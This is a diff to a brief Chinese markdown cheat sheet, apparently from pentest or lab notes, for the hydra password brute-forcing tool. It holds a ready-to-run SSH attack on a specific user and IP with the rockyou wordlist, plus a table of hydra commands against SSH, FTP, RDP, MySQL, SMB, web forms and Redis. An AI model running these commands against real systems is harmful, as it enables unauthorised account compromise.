@@ -1,3 +1,13 @@
-## 爆破ssh
+
 * hydra -l mingmingjiu -P /usr/share/wordlists/rockyou.txt ssh://10.241.108.244 -t 4 -e nsr
-##  
+
+
+|参数|服务类型|示例|
+|---|---|---|
+|`ssh`|SSH登录|`hydra -l root -P pass.txt ssh://10.0.0.1`|
+|`ftp`|FTP登录|`hydra -L users.txt -P pass.txt ftp://10.0.0.1`|
+|`rdp`|Windows远程桌面|`hydra -l admin -P pass.txt rdp://10.0.0.1`|
+|`mysql`|MySQL数据库|`hydra -l root -P pass.txt mysql://10.0.0.1`|
+|`smb`|Windows共享|`hydra -l administrator -P pass.txt smb://10.0.0.1`|
+|`http-post`|Web表单POST|`hydra -l admin -P pass.txt 10.0.0.1 http-post-form`|
+|`redis`|Redis数据库|`hydra -P pass.txt redis://10.0.0.1`|
